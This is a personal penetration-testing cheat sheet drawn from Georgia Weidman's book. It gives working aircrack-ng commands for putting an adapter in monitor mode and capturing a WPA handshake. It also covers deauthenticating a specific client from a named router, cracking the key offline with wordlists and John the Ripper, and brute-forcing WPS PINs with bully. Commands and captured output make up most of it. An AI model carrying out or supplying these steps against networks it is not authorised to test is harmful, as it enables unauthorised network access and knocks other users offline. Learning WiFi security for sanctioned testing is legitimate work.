PENTESTING:PENETRATION TESTING CHEAT SHEET BY GV

Based on book:
Penetration Testing - A hands-on introduction to Hacking by Georgia Weidman

##Wifi PenTesting
aircrack-ng is required - available by apt install under Debian.

.B Steps 
$ airmon-ng check
$ airmon-ng check kill                 # kill all processes interfering with wlan0 : NetworkManager and wpa_supplicant
$ airmon-ng start wlan0                # disables wlan0 and installs a virtual device wlan0mon in monitor mode
$ airodump-ng wlan0mon --channel 11    # wlan0 will gather all wireless packets from all nearby APs

.B Restoring:
$ airmon-ng stop wlan0mon # will remove the temp virtual wlan0mon and re-enable wlan0
$ NetworkManager          # will re-enable network manager and wpa_supplicant. Alternative : $ service network-manager start

.B Tips:
https://www.aircrack-ng.org/doku.php?id=airodump-ng
My rtl8723be under Debian seems not to capture anything. 
You need a WiFi adapter capable to operate in monitor mode and you also need drivers (usually customized) that will make use of the monitor mode.

$ iw list         # will provide info about wlan0  including supported modes:
......
......
Supported interface modes:
                 * IBSS
                 * managed
                 * AP
                 * AP/VLAN
                 * monitor
                 * mesh point
                 * P2P-client
                 * P2P-GO
.......
.......

 
$ iwconfig                        # show info about current session of wlan - includes active mode (monitor/managed) 
$ ifconfig wlan0 down             # Brings down the wlan0 - required before setting any modes - it seems that when mode is managed this is ignored.
$ iwconfig wlan0 mode monitor     # Force wlan0 to be in monitor mode. I was expecting airodump-ng wlan0 to work
$ iwconfig wlan0mon mode monitor  # Forcing monitor mode - Shouldn't aircrack supposed to do that...? 
$ iwconfig wlan0 mode managed     # Should be this mode in order NetworkManager do it's job
$ ifconfig wlan0 up               # Bring wlan0 up
$ iw wlan0 set power_save off     # disables power save
$ alias stopwlan0monitor='ifconfig wlan0 down && sleep 1 && iwconfig wlan0 mode managed && sleep 1 && ifconfig wlan0 up && sleep 1 && NetworkManager'

$ nano /etc/NetworkManager/NetworkManager.conf                    # Tweaking network manager conf file
[keyfile]                                                         # Add this line and the next one in conf file
unmanaged-devices=interface-name:wlan0mon;interface-name:wlan1mon # with this tweak you don't need to kill networkmanager (untested)


## Customized rtl8723be drivers:
https://github.com/lwfinger/rtlwifi_new
https://forums.kali.org/showthread.php?22638-rtl8723be-wireless-driver-installation
http://www.aircrack-ng.org/doku.php?id=compat-wireless


## Alternative approach that worked:
$ iwconfig              # managed mode, connected to my home wifi
$ airmon-ng check kill  # killing network manager
$ ifconfig wlan0 down   # bring down the wlan0
$ aireplay-ng -9 wlan0    # -9 is a short code for injection testing- It seems that automatically brings up wlan0 on monitor mode
Among other is get a message :
........
00:29:34  Injection is working!
........
APs info
..........

$ iwconfig
wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.467 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr=2347 B   Fragment thr:off
          Power Management:off

$ airodump-ng wlan0 --channel 11 # WORKED FINE - It seems that defining a channel works better. But it worked either without --channel
To restore use alias exitmonitor (see above)

##Capturing packets
Next we need to capture some packages by the desired router.
We need two terminal windows for this operation.

.B Terminal 1:
$ airodump-ng --channel 1 --bssid D0:60:8C:06:71:86 -w /home/gv/Desktop/ wlan0  # -w: write to /home/gv/Desktop/  
CH  1 ][ Elapsed: 4 mins ][ 2018-02-18 02:44 ][ WPA handshake: D0:60:8C:06:71:86                                         
                                                                                                                                     
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                     
 D0:60:8C:06:71:86  -83  27      939       14    0   1  54e  WPA2 CCMP   PSK  COSMOTE-067186                                         
                                                                                                                                     
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                           
                                                                                                                                     
 D0:60:8C:06:71:86  7C:0B:C6:54:85:08  -85    1e- 1e     0        2                                                                   
 D0:60:8C:06:71:86  EC:9B:F3:A1:C5:1D   -1    1e- 0      0        2                                                                   
 D0:60:8C:06:71:86  62:E3:27:80:03:3E  -79    1e- 1e     0      289  COSMOTE-067186                                                   
 D0:60:8C:06:71:86  62:E3:27:97:1C:34  -81    0 - 1      0        4                                                                   
 D0:60:8C:06:71:86  66:E3:27:F0:14:0A  -81    0 - 1      0        3                                                                   

.B Terminal 2:
You need to pick a client in order to kick him out of the rooter and force him to make a new handshake with the router.
$ aireplay-ng -0 1 -a <routermac> -c <clientmac> wlan0
$ aireplay-ng -0 1 -a D0:60:8C:06:71:86 -c 62:E3:27:80:03:3E wlan0
# You should see some info DeAuthentication of the client and reconnection

The job is finished if the message [ WPA handshake: D0:60:8C:06:71:86 appears on top of terminal 1
If this messaged is not shown, handshake is not capture and you need to keep kicking out the client.

Now that you have capture a handshake you can verify it with whireshark - open file - select the cap file and filter packets for eapol
You should see 4 messages = 4 way handshake. Sometimes, though that airodump claims that captured a handshake , you don't see 4 messages in wireshark. In this case you need to repeat the process.

##Cracking WPA Key
https://www.youtube.com/watch?v=CN61riNkmEU
Once you have a good .cap file with all 4 handshake messages you can attack (offline) to the cap file to decode the key.

$ aircrack-ng -a2 -b [router bssid] -w path/to/wordlist /path/to/capfile.cap  #Georgia skips -a2 (-a = attack mode, 2=WPA (1 is WEP))

##More Tips:
alias startwlan0monitor='airmon-ng check kill && ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up && aireplay-ng -9 wlan0 && airodump-ng wlan0'

1. http://aircrack-ng.org/doku.php?id=aircrack-ng#other_tips

2. aircrack-ng -w firstlist.txt,secondlist.txt,thirdlist.txt wpa2.eapol.cap  #providing three different word list files

3. john --stdout --wordlist=specialrules.lst --rules | aircrack-ng -e test -a 2 -w - /root/capture/wpa.cap  #attack using john the ripper

4. tshark -r <input file name> -R "eapol || wlan.fc.type_subtype == 0x08" -w <output file name>  #isolate/extract eapol 4way handshake to a smaller file

5. grep -E '^.{8,63}$' < inputfile  #WPA passwords are 8 to 63 chars long. This grep will skip passwords <8 or >63 chars.

##Finding/building a wordlist
http://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists
http://www.wirelesshack.org/wpa-wpa2-word-list-dictionaries.html
https://github.com/routerkeygen/routerkeygenPC
http://amitis1.blogspot.gr/2013/07/facebook.html
https://hashcat.net/forum/thread-6170.html
http://www.kalitutorials.net/2014/04/hack-wpawpa2-wps-reaver-kali-linux.html
http://to-markoutso.blogspot.gr/p/speedtouch-crack.html


Is quite common that people does not change the default PSK (pre shared key). 
We need some dictionaries including default PSKeys for various routers.

## Bruteforcing WPS Pin on Routers with WPS enabled
https://hackercool.com/2015/07/wpawpa2-password-cracking-with-bully/

$ bully -b F4:06:8D:6E:AC:4C -c 6 -B wlan0  #-b is the rooter mac, -c is the channel , -B stands for Bruteforce, wlan0 is the interface in use

Above bully run for an hour in target router with out result.

##Cracking WEP Encryption
Penetration Testing Book - page 347


